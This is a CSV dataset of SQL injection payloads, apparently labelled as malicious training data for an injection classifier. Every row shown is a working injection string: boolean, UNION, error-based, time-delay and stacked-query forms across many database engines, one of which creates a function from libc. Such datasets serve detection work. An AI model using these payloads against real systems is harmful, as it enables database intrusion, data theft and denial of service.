Query,Label
"1,(case when 8260=8260 then 1 else null end)",1
"-1634%' union all select 5937,5937,5937,5937--",1
"1'+(select 'otqy' where 2754=2754 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",1
"1');select count(*) from generate_series(1,5000000) and ('cewn'='cewn",1
"1) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (3872=3872",1
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
-1985))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((1248=1248,1
"1"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""dtfg""=""dtfg",1
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('wnzv'='wnzv",1
"1"")) as dpln where 4193=4193 rlike sleep(5)--",1
1')) and (3020=3020)*6703 and (('mgfd'='mgfd,1
-7775 or 8571=8571--,1
"1""))) and make_set(8403=8403,8899) and (((""czvm"" like ""czvm",1
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""xyjg""=""xyjg",1
1 and 6969=(select 6969 from pg_sleep(5))# pkcp,1
"(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""%""=""",1
1'||(select 'cgup' from dual where 5383=5383 waitfor delay '0:0:5'--,1
"1)) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((2939=2939",1
"1""))) order by 1--",1
"1) and elt(3138=1817,1817)",1
"-9758'+(select 'rlcy' where 3691=3691 union all select 3691,3691,3691,3691,3691,3691,3691--",1
"-9629'))) union all select 3077,3077,3077,3077#",1
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'hhrw' like 'hhrw",1
"1))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
1' and sleep(5) and 'usgv' like 'usgv,1
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('xfmq'='xfmq",1
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rnyb'='rnyb",1
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
1);begin dbms_lock.sleep(5); end and (9416=9416,1
1')));begin user_lock.sleep(5); end--,1
1)));select (case when (3336=9781) then 3336 else 1/(select 0) end)--,1
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)# fzni",1
"1"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""lsca"" like ""lsca",1
-5967 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# lhoh,1
"1) as pyjx where 9005=9005;select benchmark(5000000,md5(0x714e4153))#",1
1) as jqbp where 5407=5407 and 4595=4595#,1
"1"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"-4145%"")) union all select 9404,9404,9404,9404,9404,9404,9404#",1
"1"") where 8657=8657;select benchmark(5000000,md5(0x714e4153))#",1
"-3209'+(select ldum where 9912=9912 union all select 9912,9912,9912,9912#",1
"1'));select * from generate_series(7407,7407,case when (7407=6562) then 1 else 0 end) limit 1--",1
"-1337"") union all select 7508--",1
"1""));select sleep(5)#",1
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'='",1
"1)) as oywa where 7951=7951 union all select null,null,null,null,null,null#",1
-3582') or 6872=6872 and ('gyfj'='gyfj,1
"1""))) union all select null,null#",1
"1""));begin dbms_lock.sleep(5); end and ((""rqay"" like ""rqay",1
(select chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7812=7812) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113) from dual),1
"1"" where 7015=7015 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
"-9098' union all select 3476,3476,3476,3476,3476,3476#",1
"1)) as potk where 5040=5040 or elt(5873=5873,sleep(5))#",1
"-4736')) or elt(5835=5509,5509) and (('iawg'='iawg",1
"-9171) union all select 6880,6880,6880,6880,6880,6880,6880#",1
"1""))) and (select * from (select(sleep(5)))fzno) and (((""uncg""=""uncg",1
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),1
"1"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1"")) as hzcq where 9250=9250 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",1
"1') as yuqv where 6007=6007 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
1 where 2239=2239 and 6969=(select 6969 from pg_sleep(5))--,1
"1%"")) waitfor delay '0:0:5' and ((""%""=""",1
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('gsjp'='gsjp,1
"1))) and elt(1210=1210,sleep(5)) and (((2341=2341",1
"1'+(select lhho where 7579=7579 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"1) where 5232=5232 union all select null,null,null#",1
-3436) or 9281=3172,1
"1%'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('%'='",1
"-9558""))) union all select 2935,2935,2935,2935,2935--",1
"-2140)) union all select 8174,8174,8174#",1
-7999) or 8422=1336,1
1) and 9198=9198--,1
(select (case when (3592=3592) then 3592 else 3592*(select 3592 from information_schema.character_sets) end)),1
"-9156')) union all select 9110,9110,9110,9110#",1
1' in boolean mode) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#,1
1'||(select 'byxb' where 8351=8351 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))||',1
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('vhqm'='vhqm,1
-5268') where 5615=5615 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('clhg'='clhg",1
"1') where 7646=7646 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1') where 2928=2928 and (select * from (select(sleep(5)))gcrr)#,1
"-6754') where 8388=8388 union all select 8388,8388,8388,8388,8388--",1
"1"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""rkvr""=""rkvr",1
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))# mpyu",1
"1%"")));select pg_sleep(5)--",1
"1 union all select null,null,null,null,null,null,null--",1
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""regi"" like ""regi",1
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('wgpg' like 'wgpg",1
1') where 8707=8707 and 3210=1477--,1
"1%"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""%""=""",1
"1"" where 2483=2483;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
"1"")));select (case when (9434=2780) then 9434 else 9434*(select 9434 from information_schema.character_sets) end)#",1
"1)));iif(9190=5059,1,1/0)",1
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('pneh' like 'pneh,1
1'));begin dbms_lock.sleep(5); end--,1
"-7945%'))) union all select 4286,4286,4286,4286,4286,4286--",1
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('zovb' like 'zovb",1
-9311)) or (5065=2572)*2572 and ((1199=1199,1
1'+(select somn where 8636=8636 rlike sleep(5))+',1
"1') as xvcr where 6456=6456 and 3824=benchmark(5000000,md5(0x76555642))--",1
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'gzlz' like 'gzlz",1
"1 where 3535=3535 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('iaud'='iaud",1
-4583') as evbo where 6055=6055 union all select 6055--,1
"1') as kbja where 4275=4275 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
"1%"") and 8715=5529",1
"-8490)) union all select 6910,6910,6910,6910,6910,6910#",1
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""%""=""",1
"-3234%"")) or elt(1032=1032,3623) and ((""%""=""",1
-8369) where 7234=7234 order by 1--,1
"1) as qodq where 4945=4945 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1')) as sjzf where 9997=9997 and 4193=5408,1
"1';iif(9007=3836,1,1/0)",1
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
1')) as dckd where 1794=1794;select (case when (2914=3335) then 2914 else cast(1 as int)/(select 0 from dual) end) from dual--,1
"1"")) union all select null,null,null,null#",1
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""gcyp"" like ""gcyp",1
-5369') or 3208=6669#,1
"1"");select benchmark(5000000,md5(0x4c4d6142)) and (""hgds"" like ""hgds",1
"1%')) union all select null,null,null,null,null,null,null,null#",1
1%'));select sleep(5) and (('%'=',1
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('ufbr'='ufbr",1
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",1
"-6475""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""mdsx"" like ""mdsx",1
"1 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1') as pkis where 3446=3446 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",1
"1',(select (case when (1392=1380) then 1 else 1392*(select 1392 from master..sysdatabases) end))",1
"1%"");(select * from (select(sleep(5)))srmq) and (""%""=""",1
"1"") where 2656=2656 or sleep(5)--",1
"1 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1"" where 2886=2886;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%"";select (case when (8350=7872) then 8350 else 8350*(select 8350 from information_schema.character_sets) end)#",1
"1"")) as ynuw where 9138=9138;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",1
"-3321"" where 1603=1603 union all select 1603,1603,1603,1603#",1
"1) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
1) rlike (select (case when (7689=7689) then 1 else 0x28 end)),1
"1')) as namw where 1740=1740 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
"1%"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",1
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",1
"1"") where 6903=6903;select (case when (8808=1367) then 1 else 8808*(select 8808 from master..sysdatabases) end)--",1
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('xcxr' like 'xcxr",1
"1"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""rvuz"" like ""rvuz",1
"-9145') as xyya where 8950=8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
1'||(select 'znba' where 8323=8323;select pg_sleep(5)--,1
"1'+(select syrz where 7699=7699 union all select null,null,null#",1
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
"-6220' union all select 1462,1462#",1
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""=""",1
"1"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
-1304') union all select 7639#,1
"1"" or 6793=(select 6793 from pg_sleep(5)) and ""kojr""=""kojr",1
1%'))) and (3020=3020)*6703 and ((('%'=',1
"1'||(select 'xtcb' where 5240=5240;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",1
"1') and elt(1210=1210,sleep(5)) and ('medg'='medg",1
1 or 6793=(select 6793 from pg_sleep(5))# awpq,1
"1%"")) and 2006=2006",1
"-1152%') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='",1
"1' where 4358=4358 union all select null,null,null,null--",1
"1"") where 7165=7165 or 8466=benchmark(5000000,md5(0x694a4745))--",1
"1)));select benchmark(5000000,md5(0x714e4153))#",1
-3821') or 9323=9323#,1
"1"") where 1300=1300 order by 1#",1
"1 union all select null,null,null,null,null--",1
"1%') and elt(4249=4249,7259) and ('%'='",1
"1) where 7159=7159;select count(*) from generate_series(1,5000000)--",1
"-4136')) as cczp where 7052=7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",1
-4323')) or 6968=1393,1
"-1051"") where 6586=6586 or 6647=6738#",1
"1"") as vcvw where 2445=2445 and 8594=(select 8594 from pg_sleep(5))--",1
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1%"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"-6359"")) or elt(3546=2433,2433) and ((""qxat""=""qxat",1
"1%""));begin user_lock.sleep(5); end--",1
1'||(select 'flbv' where 7451=7451 and 4595=4595#,1
"1) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
-4137)) as elxu where 5672=5672 order by 1--,1
"1') as yhgk where 9246=9246 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",1
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""tgdu""=""tgdu",1
"1' where 2964=2964 union all select null,null,null#",1
1) where 6950=6950 rlike (select * from (select(sleep(5)))sgvo)--,1
"1,(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))",1
"1' in boolean mode) and elt(1210=1210,sleep(5))#",1
"-8950"")) as uahs where 2113=2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""vfvh""=""vfvh",1
1%' or (select * from (select(sleep(5)))ydpu) and '%'=',1
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""ajuh""=""ajuh",1
"1%"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""cgpm"" like ""cgpm",1
"1%""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",1
"-4095') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
(select 2527 from pg_sleep(5)),1
"-5431""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""ipmo""=""ipmo",1
1')) waitfor delay '0:0:5' and (('bbqk'='bbqk,1
"1);select * from generate_series(7610,7610,case when (7610=9416) then 1 else 0 end) limit 1--",1
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('aqdj'='aqdj",1
"1'||(select 'rttq' from dual where 7368=7368 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'",1
"1"")) as nhus where 3689=3689;if(4135=2165) select 4135 else drop function otyy--",1
"1') where 2120=2120;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
"1%' union all select null,null--",1
(select 2412=('qqpjq'||(select case 2412 when 2412 then 1 else 0 end from rdb$database)||'qzvzq')),1
"1 and elt(1210=1210,sleep(5))",1
1' where 1017=1017 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
"1%"")) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""tfso""=""tfso",1
(1589=1589)*1,1
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ozan'='ozan",1
"1%""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
-9541 where 4291=4291 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
(select (case when (6035=9882) then 6035 else 6035*(select 6035 from mysql.db) end)),1
"1"") where 5358=5358;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",1
"1%')) union all select null,null,null,null,null,null,null,null,null#",1
1';select pg_sleep(5) and 'rpka'='rpka,1
"1)) and 8635=(select count(*) from generate_series(1,5000000))--",1
"1%' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and '%'='",1
"1%"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
1) and 7533=7533 and (7175=7175,1
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",1
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
-7786')) or 9323=9323#,1
1' in boolean mode);select (case when (4306=2815) then 4306 else 1/(select 0) end)--,1
"1 where 9072=9072 and elt(4249=4249,7259)--",1
-6665'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('winx'='winx,1
"1) as rsyw where 4857=4857 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
"-4785""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
-6086')) or (6719=7280)*7280 and (('ozbj'='ozbj,1
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ibav'='ibav",1
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'eimq'='eimq",1
"1"" where 1452=1452 union all select null,null,null,null--",1
"1) where 6304=6304;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1"")) as pxdp where 4575=4575 and elt(8258=7218,7218)--",1
1'||(select 'wadx' where 4287=4287 or sleep(5)#,1
1);waitfor delay '0:0:5',1
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ajkb'='ajkb",1
-4542')) order by 1#,1
"1"")) union all select null,null,null,null,null,null--",1
"1) or 8466=benchmark(5000000,md5(0x694a4745))",1
"-9978"" or make_set(4893=9765,9765) and ""mhjt""=""mhjt",1
"1"" and 2006=2006",1
-1730' or 8571=8571--,1
"1"" where 2221=2221 and 5318=8398--",1
"-8034"" or 8571=8571--",1
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"1' in boolean mode) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
1' where 7882=7882 and 6663=4524--,1
"1' where 5230=5230;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1'||(select 'jbgg' from dual where 1986=1986 union all select null,null,null,null,null,null,null,null,null,null#",1
"1""))) and elt(1210=1210,sleep(5)) and (((""ilge"" like ""ilge",1
"-4346') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1%"";select pg_sleep(5) and ""%""=""",1
"1"" union all select null,null,null,null,null#",1
"1))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
"1%"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""",1
"1"")));select sleep(5)#",1
1 where 6223=6223 rlike sleep(5)#,1
"1"") where 9285=9285 and 8506=8343#",1
"1%'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('%'='",1
1'+(select 'rejz' where 1530=1530 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',1
"1"" and (3020=3020)*6703",1
"1')) and elt(3053=9778,9778) and (('yfaa' like 'yfaa",1
-7810 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))-- vuvj,1
"1"") union all select null,null,null,null,null,null,null,null--",1
"1')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1'+(select 'iyvn' where 9358=9358 or elt(6272=6272,sleep(5)))+'",1
"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('yiem'='yiem",1
"1)) union all select null,null,null,null,null#",1
-4572') union all select 3520--,1
"1"")) and 6969=(select 6969 from pg_sleep(5)) and ((""cowu"" like ""cowu",1
"1' where 5004=5004 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"-6618""))) order by 1#",1
"-4407"") where 2055=2055 or elt(9714=5040,5040)--",1
1'+(select 'hhnz' where 2465=2465;select (case when (3537=5218) then 3537 else 3537*(select 3537 from mysql.db) end)#,1
"1"") where 4822=4822 union all select null,null,null,null,null,null,null,null,null,null--",1
"-8544%"" or 6872=6872 and ""%""=""",1
"-6457 where 1764=1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",1
1') and 2305=1934,1
"1))) union all select null,null,null,null,null,null,null--",1
-2300) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),1
1'+(select hett where 7228=7228;waitfor delay '0:0:5')+',1
"1""));select count(*) from generate_series(1,5000000) and ((""dros""=""dros",1
